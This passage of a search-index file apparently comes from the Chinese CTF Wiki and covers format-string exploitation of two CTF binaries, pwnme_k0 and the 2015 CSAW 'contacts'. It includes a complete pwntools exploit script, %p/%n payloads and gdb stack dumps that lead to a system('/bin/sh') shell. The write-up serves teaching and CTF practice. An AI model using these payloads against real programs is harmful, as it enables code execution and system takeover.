\u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"pwn/fmtstr/fmtstr_example/#_19","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [rbp+0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"pwn/fmtstr/fmtstr_example/#_20","text":"\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740(\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f\u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf(\u5982 ubuntu 18.04)\u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash, \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn","title":"\u4fee\u6539\u5730\u5740"},{"location":"pwn/fmtstr/fmtstr_example/#_21","text":"from pwn import * context . log_level = \"debug\" context . arch = \"amd64\" sh = process ( \"./pwnme_k0\" ) binary = ELF ( \"pwnme_k0\" ) #gdb.attach(sh) sh . recv () sh . writeline ( \"1\" * 8 ) sh . recv () sh . writeline ( \"%6$p\" ) sh . recv () sh . writeline ( \"1\" ) sh . recvuntil ( \"0x\" ) ret_addr = int ( sh . recvline () . strip (), 16 ) - 0x38 success ( \"ret_addr:\" + hex ( ret_addr )) sh . recv () sh . writeline ( \"2\" ) sh . recv () sh . sendline ( p64 ( ret_addr )) sh . recv () #sh.writeline(\"%2214d%8$hn\") #0x4008aa-0x4008a6 sh . writeline ( \" %2218d %8$hn\" ) sh . recv () sh . writeline ( \"1\" ) sh . recv () sh . interactive ()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#_22","text":"","title":"\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"pwn/fmtstr/fmtstr_example/#_23","text":"\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002","title":"\u539f\u7406"},{"location":"pwn/fmtstr/fmtstr_example/#_24","text":"\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74CSAW\u4e2d\u7684contacts\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/fmtstr/fmtstr_example/#_25","text":"\u279c 2015 -CSAW-contacts git: ( master ) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86NX\u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86Canary\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"pwn/fmtstr/fmtstr_example/#_26","text":"\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u8f93\u5165\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo ( int a1 , int a2 , int a3 , char * format ) { printf ( \" \\t Name: %s \\n \" , a1 ); printf ( \" \\t Length %u \\n \" , a2 ); printf ( \" \\t Phone #: %s \\n \" , a3 ); printf ( \" \\t Description: \" ); return printf ( format ); } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aformat\u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#_27","text":"\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684shell\uff0c\u4ece\u800c\u62ff\u5230flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301got\u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301got\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709printf\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020/bin/sh\u8ba9\u5b83\u6267\u884csystem('/bin/sh')\uff0c\u4f46\u662fprintf\u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165system_addr+'bbbb'+addr of '/bin/sh\u2018\u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7leave\u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58ebp\u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884cleave\u6307\u4ee4\u7684\u65f6\u5019\uff0cesp\u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58ebp\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6PrintInfo\u51fd\u6570\u4e2d\u5b58\u50a8ebp\u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684ebp\u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58ebp\u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684ebp\u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373main\u51fd\u6570\uff09\u7684ebp\u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6839\u636elibc database\u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3asystem_addr+'bbbb'+binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684ebp)\u4e3a \u5b58\u50a8system_addr\u7684\u5730\u5740-4 \u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c move esp,ebp\uff0c\u5c06esp\u6307\u5411system_addr\u7684\u5730\u5740-4 pop ebp\uff0c \u5c06esp\u6307\u5411system_addr ret\uff0c\u5c06eip\u6307\u5411system_addr\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"pwn/fmtstr/fmtstr_example/#_28","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53caPrintInfo\u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684libc_start_main_ret\u5730\u5740(\u8be5\u5730\u5740\u662f\u5f53main\u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570)\u6765\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728printf\u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684printf\u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [ #1] 0x8048c27 \u2192 leave [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [ #3] 0x80487a2 \u2192 jmp 0x80487b3 [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [ #5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 [ '$esp' , '140' ] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 [ '$esp' , 'l140' ] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ ebp-0xc ] , 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 ( \"g+\" ? ) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 ( \"%s\" ? ) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 ( \"P\" ? ) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u5c31\u662fmain\u76f8\u5e94\u7684\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528fmtarg\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a31\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636elibc-database\u6765\u83b7\u53d6\u5bf9\u5e94\u7684libc\uff0c\u7ee7\u800c\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u57400xffffcd2c\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u6784\u9020\u6211\u4eec\u7684\u8054\u7cfb\u4eba\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a11\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684ebp\u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp","title":"\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb"},{"location":"pwn/fmtstr/fmtstr_example/#_29","text":"\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684ebp\u5730\u5740\u3002 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684bbbb\u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 